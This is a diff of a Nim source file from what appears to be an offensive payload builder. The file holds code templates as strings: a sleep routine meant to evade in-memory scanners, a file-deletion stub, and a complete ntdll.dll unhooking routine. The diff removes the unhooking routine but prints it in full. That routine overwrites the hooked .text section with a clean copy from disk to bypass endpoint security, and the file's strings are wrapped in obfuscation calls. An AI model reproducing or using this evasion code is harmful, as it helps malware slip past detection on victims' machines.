@@ -1,8 +1,7 @@
 import strformat
 import strutils
-from GlobalVars import sleeptime
 
-let SleepStub * = fmt"""
+let SleepStubFirst * = fmt"""
 # Credit to @WhyDee86 - https://twitter.com/WhyDee86 for this sleep implementation
 
 import random
@@ -106,11 +105,8 @@ proc HowMuchTimeWouldYoulikeToSleep * (sec : int) =
       Calc()
       delta = getTime() - t0
   #echo delta.inSeconds()," Seconds"
-
-
-echo obf("[*] Sleeping to avoid in memory scanners")
-HowMuchTimeWouldYoulikeToSleep({sleeptime}) 
 """
+
 
 let FileDeleteStub * = """
 
@@ -190,63 +186,6 @@ when isMainModule:
         echo obf("[*] File deleted successfully")
 
 """
-
-
-let UnhookStub * = """
-
-from winim import MODULEINFO, GetModuleInformation
-
-proc ntdllunhook(): bool =
-  let low: uint16 = 0
-  var 
-      processH = GetCurrentProcess()
-      mi : MODULEINFO
-      ntdllModule = GetModuleHandleA(obf("ntdll.dll"))
-      ntdllBase : LPVOID
-      ntdllFile : FileHandle
-      ntdllMapping : HANDLE
-      ntdllMappingAddress : LPVOID
-      hookedDosHeader : PIMAGE_DOS_HEADER
-      hookedNtHeader : PIMAGE_NT_HEADERS
-      hookedSectionHeader : PIMAGE_SECTION_HEADER
-
-  GetModuleInformation(processH, ntdllModule, addr mi, cast[DWORD](sizeof(mi)))
-  ntdllBase = mi.lpBaseOfDll
-  ntdllFile = getOsFileHandle(open(obf("C:\\windows\\system32\\ntdll.dll"),fmRead))
-  ntdllMapping = CreateFileMapping(ntdllFile, NULL, PAGE_READONLY or SEC_IMAGE, 0, 0, NULL) # 0x02 =  PAGE_READONLY & 0x1000000 = SEC_IMAGE
-  if ntdllMapping == 0:
-    echo obf("Could not create file mapping object ") &  fmt"({GetLastError()})."
-    return false
-  ntdllMappingAddress = MapViewOfFile(ntdllMapping, FILE_MAP_READ, 0, 0, 0)
-  if ntdllMappingAddress.isNil:
-    echo obf("Could not map view of file ") & fmt"({GetLastError()})."
-    return false
-  hookedDosHeader = cast[PIMAGE_DOS_HEADER](ntdllBase)
-  hookedNtHeader = cast[PIMAGE_NT_HEADERS](cast[DWORD_PTR](ntdllBase) + hookedDosHeader.e_lfanew)
-  for Section in low ..< hookedNtHeader.FileHeader.NumberOfSections:
-      hookedSectionHeader = cast[PIMAGE_SECTION_HEADER](cast[DWORD_PTR](IMAGE_FIRST_SECTION(hookedNtHeader)) + cast[DWORD_PTR](IMAGE_SIZEOF_SECTION_HEADER * Section))
-      if ".text" in toString(hookedSectionHeader.Name):
-          var oldProtection : DWORD = 0
-          if VirtualProtect(ntdllBase + hookedSectionHeader.VirtualAddress, hookedSectionHeader.Misc.VirtualSize, 0x40, addr oldProtection) == 0:#0x40 = PAGE_EXECUTE_READWRITE
-            echo obf("Failed calling VirtualProtect ") & fmt"({GetLastError()})."
-            return false
-          copyMem(ntdllBase + hookedSectionHeader.VirtualAddress, ntdllMappingAddress + hookedSectionHeader.VirtualAddress, hookedSectionHeader.Misc.VirtualSize)
-          if VirtualProtect(ntdllBase + hookedSectionHeader.VirtualAddress, hookedSectionHeader.Misc.VirtualSize, oldProtection, addr oldProtection) == 0:
-            echo obf("Failed resetting memory back to it's orignal protections ") & fmt"({GetLastError()})."
-            return false  
-  CloseHandle(processH)
-  CloseHandle(ntdllFile)
-  CloseHandle(ntdllMapping)
-  FreeLibrary(ntdllModule)
-  return true
-
-
-when isMainModule:
-  var result = ntdllunhook()
-  echo obf("[*] unhook Ntdll: ") & fmt"{bool(result)}"
-
-"""
-
 
 
 
